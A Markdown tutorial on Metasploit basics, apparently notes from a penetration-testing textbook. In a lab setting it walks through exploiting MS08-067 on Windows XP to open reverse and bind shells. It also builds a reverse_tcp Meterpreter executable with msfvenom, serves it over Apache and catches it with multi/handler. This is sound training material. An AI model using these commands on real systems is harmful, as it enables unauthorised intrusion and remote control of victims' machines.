title: Metasploit

## Metasploit Basics

### Starting Metasploit

Metasploit uses postgresql as the backend database

- start the postgresql database

```
root@kali:~# service postgresql start
```

The command creates a postgresql user `msf3` and a database to store the data


- start the webserver 

```
root@kali:~# service metasploit start
```

The above command starts metasploit's Remote Procedure Call (RPC) server and web server

- start the interface

There are **multiple** interfaces to metasploit. **msfconsole** is a text based interface to metasploit.

```
root@kali:~# msfconsole
```

The above command will start a console

```
    ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


Large pentest? List, sort, group, tag and search your hosts and services
in Metasploit Pro -- type 'go_pro' to launch it now.

       =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops

msf >
```

- getting help

use the `help` command to get help

```
msf > help route
Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]

Route traffic destined to a given subnet through a supplied session.
The default comm is Local...
```

### Finding Metasploit Modules

Metasploit also has an online database of modules (http://www.rapid7.com/db/modules/) and a built-in search function that can be used to search for the correct modules.

- built-in search

searching for a metasploit module - use the `search` command

``` 
msf > search ms08-067

Matching Modules
================

   Name                                 Disclosure Date          Rank   Description
   ----                                 ---------------          ----   -----------
   exploit/windows/smb/ms08_067_netapi  2008-10-28 00:00:00 UTC  great  Microsoft Server
                                                                          Service Relative Path
                                                                          Stack Corruption
```

`exploit/windows/smb/ms08_067_netapi` is the module name

getting more info about the module - use the `info` command

```
 msf > info exploit/windows/smb/ms08_067_netapi

        ❶Name: Microsoft Server Service Relative Path Stack Corruption
      ❷Module: exploit/windows/smb/ms08_067_netapi
      Version: 0
    ❸Platform: Windows
  ❹Privileged: Yes
      License: Metasploit Framework License (BSD)
        ❺Rank: Great

❻ Available targets:
    Id  Name
    --  ----
    0   Automatic Targeting
    1   Windows 2000 Universal
    2   Windows XP SP0/SP1 Universal
    --snip--
    67  Windows 2003 SP2 Spanish (NX)

  ❼ Basic options:
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    RHOST                     yes       The target address
    RPORT    445              yes       Set the SMB service port
    SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

❽ Payload information:
    Space: 400
    Avoid: 8 characters
❾ Description:
    This module exploits a parsing flaw in the path canonicalization
    code of NetAPI32.dll through the Server Service. This module is
    capable of bypassing NX on some operating systems and service packs.
    The correct target must be used to prevent the Server Service (along
    with a dozen others in the same process) from crashing. Windows XP
    targets seem to handle multiple successful exploitation events, but
    2003 targets will often crash or hang on subsequent attempts. This
    is just the first version of this module, full support for NX bypass
    on 2003, along with other platforms, is still in development.
❿ References:
    http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx
```

### Enabling The Module

use the `use` command to set the exploit module

```
msf > use windows/smb/ms08_067_netapi
msf  exploit(ms08_067_netapi) >
```

### Setting Module Options

use the `show options` command to show the module options that need to be set

```
msf  exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
  RHOST                     yes       The target address
  RPORT    445              yes       Set the SMB service port
  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf  exploit(ms08_067_netapi) >
```

`RHOST` - refers to the remote host to exploit  
`RPORT` - refers to the remote port to attack  
`SMBPIPE` - used for Windows Interprocess Communication  

- setting remote host

```
msf  exploit(ms08_067_netapi) > set RHOST 192.168.20.10
```

- setting remote port

```
msf  exploit(ms08_067_netapi) > set RPORT 445
```

- setting SMBPIPE

leave it at default

- exploit target

the target operating system and version. view available targets with the following command

```
msf  exploit(ms08_067_netapi) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows XP SP2 English (AlwaysOn NX)
   4   Windows XP SP2 English (NX)
   5   Windows XP SP3 English (AlwaysOn NX)
   --snip--
   67  Windows 2003 SP2 Spanish (NX)
```

- setting the target

set the type of target machine

```
msf  exploit(ms08_067_netapi) > set target _<target_number>_
```

### Payloads

Payloads tell what the system should do after the exploit is successful

- find compatible payloads

use ths `show payloads` command to see compatible payloads

```
msf  exploit(ms08_067_netapi) > show payloads

Compatible Payloads
===================

   Name                                Disclosure Date  Rank    Description
   ----                                ---------------  ----    -----------
   generic/custom                                       normal  Custom Payload
   generic/debug_trap                                   normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                               normal  Generic Command Shell, Bind TCP
                                                                  Inline
   generic/shell_reverse_tcp                            normal  Generic Command Shell, Reverse
                                                                  Inline
   generic/tight_loop                                   normal  Generic x86 Tight Loop
   windows/dllinject/bind_ipv6_tcp                      normal  Reflective DLL Injection, Bind
                                                                  TCP Stager (IPv6)
   windows/dllinject/bind_nonx_tcp                      normal  Reflective DLL Injection, Bind
                                                                  TCP Stager (No NX or Win7)
   windows/dllinject/bind_tcp                           normal  Reflective DLL Injection, Bind
                                                                  TCP Stager
   windows/dllinject/reverse_http                       normal  Reflective DLL Injection, Reverse
                                                                  HTTP Stager
--snip--
   windows/vncinject/reverse_ipv6_http                  normal  VNC Server (Reflective Injection),
                                                                  Reverse HTTP Stager (IPv6)
   windows/vncinject/reverse_ipv6_tcp                   normal  VNC Server (Reflective Injection),
                                                                  Reverse TCP Stager (IPv6)
--snip--
   windows/vncinject/reverse_tcp                        normal  VNC Server (Reflective Injection),
                                                                  Reverse TCP Stager
   windows/vncinject/reverse_tcp_allports               normal  VNC Server (Reflective Injection),
                                                                  Reverse All-Port TCP Stager
   windows/vncinject/reverse_tcp_dns                    normal  VNC Server (Reflective Injection),
                                                                  Reverse TCP Stager (DNS)
```

!!! Note

    If payload is not set, metasploit will automatically choose the default payload and associated settings and run it.


### Running The Exploit

use the `exploit` command to run the exploit

```
msf  exploit(ms08_067_netapi) > exploit

[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at
2015-08-31 07:37:05 -0400

meterpreter >
```

- to exit use the `exit` command

```
meterpreter > exit
[*] Shutting down Meterpreter...

[*] Meterpreter session 1 closed.  Reason: User exit
msf  exploit(ms08_067_netapi) >
```

### Type of Shells

Shells fall into two categories

- bind shells
- reverse shells

- Bind Shells

A _bind shell_ instructs the target machine to open a command shell and listen on a local port. The attack machine then connects to the target machine on the listening port. 

- Reverse Shells

A _reverse shell_, actively pushes a connection back to the attack machine rather than waiting for an incoming connection. In the attack machine, we open a local port and listen for a connection from our target because this reverse connection is more likely to make it through a firewall.

### Setting Payload Manually

use the `set payload` command to specify the payload

```
msf  exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
```

Since a reverse shell is used, specify the local host and port to listen on

``` hl_lines="17 18"
msf  exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.20.10    yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
  ❶LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```

- setting the local host

```
msf  exploit(ms08_067_netapi) > set LHOST _<local_host_ip>_
```

- running the exploit again

```
msf  exploit(ms08_067_netapi) > exploit

[*] Started reverse handler on 192.168.20.9:4444 ❶
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX) ❷
[*] Attempting to trigger the vulnerability...
[*] Command shell session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1374)
    at 2015-08-31 10:29:36 -0400

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

- closing the shell

To close the shell, type ctrl-C and enter **`y`** at the prompt to abort the session.

```
C:\WINDOWS\system32>^C
Abort session 2? [y/N]  y

[*] Command shell session 2 closed.  Reason: User exit
msf  exploit(ms08_067_netapi) >
```

### Msfcli

Msfcli is a command line interface. Used particularly when metasploit is used within scripts and for testing metasploit modules

- getting help for msfcli

use the `-h` flag to get help on the msfcli command

```
root@kali:~# msfcli -h
❶ Usage: /opt/metasploit/apps/pro/msf3/msfcli <exploit_name> <option=value> [mode]
  ==============================================================================

      Mode           Description
      ----           -----------
      (A)dvanced     Show available advanced options for this module
      (AC)tions      Show available actions for this auxiliary module
      (C)heck        Run the check routine of the selected module
      (E)xecute      Execute the selected module
      (H)elp         You're looking at it baby!
      (I)DS Evasion  Show available ids evasion options for this module
     ❷(O)ptions      Show available options for this module
     ❸(P)ayloads     Show available payloads for this module
      (S)ummary      Show information about this module
      (T)argets      Show available targets for this exploit module
```

- useful modes in msfcli

msfcli has some modes built-in to build the final command

- `o` mode shows the selected module's options  
- `P` shows the compatible payloads

- showing options

``` hl_lines="6"
root@kali:~# msfcli windows/smb/ms08_067_netapi O
[*] Please wait while we load the module tree...

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
```

- setting host

```
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10
```

- showing payloads

`P` shows the compatible payloads

``` hl_lines="1"
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P
[*] Please wait while we load the module tree...

Compatible payloads
===================

   Name                                             Description
   ----                                             -----------
   generic/custom                                   Use custom string or file as payload. Set
                                                      either PAYLOADFILE or PAYLOADSTR.
   generic/debug_trap                               Generate a debug trap in the target process
   generic/shell_bind_tcp                           Listen for a connection and spawn a command
                                                      shell
   generic/shell_reverse_tcp                        Connect back to attacker and spawn a command
                                                      shell
   generic/tight_loop                               Generate a tight loop in the target process
--snip--
```

- setting payloads

```hl_lines="1"
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp
[*] Please wait while we load the module tree...

RHOST => 192.168.20.10
PAYLOAD => windows/shell_bind_tcp
[*] Started bind handler ❶
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444)
    at 2015-08-31 16:43:54 -0400

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

- running the exploit

use the `E` flag to tell msfcli to run the exploit

```hl_lines="1"
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E
[*] Please wait while we load the module tree...

RHOST => 192.168.20.10
PAYLOAD => windows/shell_bind_tcp
[*] Started bind handler ❶
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444)
    at 2015-08-31 16:43:54 -0400

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

### Creating Standalone Payloads With Msfvenom

- view the help page of msfvenom

```
root@kali:~# msfvenom - h
```

- listing all payloads

```
root@kali:~# msfvenom -l payloads
```

- setting payload

use the `-p` flag to set the payload

```
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp
```

- setting options

use the `-o` flag to set the options

```
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o
[*] Options for payload/windows/meterpreter/reverse_tcp

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  process          yes       Exit technique: seh, thread, process,
                                           none
    LHOST                      yes       The listen address
    LPORT     4444             yes       The listen port
```

set the `LHOST` using the option `LHOST=12345`

- choosing the output format

use the command `msfvenom --help-formats` to show the output formats

```
root@kali:~# msfvenom --help-formats
Executable formats
    asp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small,
      loop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war
Transform formats
    bash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell,
      psl, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

- selecting the output format

use the `-f` flag to set the output format

```
root@kali:~# msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe
```

- redirecting the output to a file

```
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > chapter4example.exe
```

There is no output to the screen, but if we run the file command on our newly created executable file, we see that it’s a Windows executable that will run on any Windows system as long as a user attempts to run it.

### Serving Payloads

- upload the payload to the webserver

```
root@kali:~# cp chapter4example.exe /var/www
root@kali:~# service apache2 start
Starting web server apache2
```

browse the target machine and point the browser to the following url to _http://192.168.20.9/chapter4example.exe_ and download the file.

Before executing the file, a handler needs to be configured. 

- using the multi/handler module

allows to set up standalone handlers. We need to catch the meterpreter connection when the malicious executable is executed from the target machine.

- using the multi/handle module

```
msf > use multi/handler
msf  exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf  exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process,
                                          none
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port

--snip--
msf  exploit(handler) >
```

set the `LHOST` and the `LPORT` using the following commands

```
msf  exploit(handler) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf  exploit(handler) > set LPORT 12345
LPORT => 12345
msf  exploit(handler) > exploit

[*] Started reverse handler on 192.168.20.9:12345
[*] Starting the payload handler...
```

now the handler is listening ...

login to the target machine and run the executable - we get the following shell

```
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:12345 -> 192.168.20.10:49437) at 2015-09-01 11:20:00 -0400

meterpreter >
```

### Using an Auxiliary Module

modules not used for exploitation are called _auxiliary modules_. They include things like vulnerability scanners, fuzzers and even DoS modules

!!! Note
  
    A good rule of thumb to remember is that exploit modules use a payload and auxiliary modules do not.

- auxiliary module to enumerate the listening pipes on a SMB server

`auxiliary/scanner/smb/pipe_auditor`

``` hl_lines="8 12"
msf > use scanner/smb/pipe_auditor
msf  auxiliary(pipe_auditor) > show options

Module options (auxiliary/scanner/smb/pipe_auditor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads
```

Multiple remote hosts can be specified

The THREADS option allows us to control the speed of Metasploit by having our module run in multiple threads

```
msf  auxiliary(pipe_auditor) > set RHOSTS 192.168.20.10
RHOSTS => 192.168.20.10
```

Though nothing is being technically exploited, metasploit can be made to run the auxiliary module using the `exploit` command

``` hl_lines="3"
msf  auxiliary(pipe_auditor) > exploit

[*] 192.168.20.10 - Pipes: \browser
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf  auxiliary(pipe_auditor) >
```

The module audits the listening SMB pipes on the target machine and it turns out that the target has only one SMB pipe i.e. BROWSER

### Upgrading Metasploit

```
root@kali:~# msfupdate
```


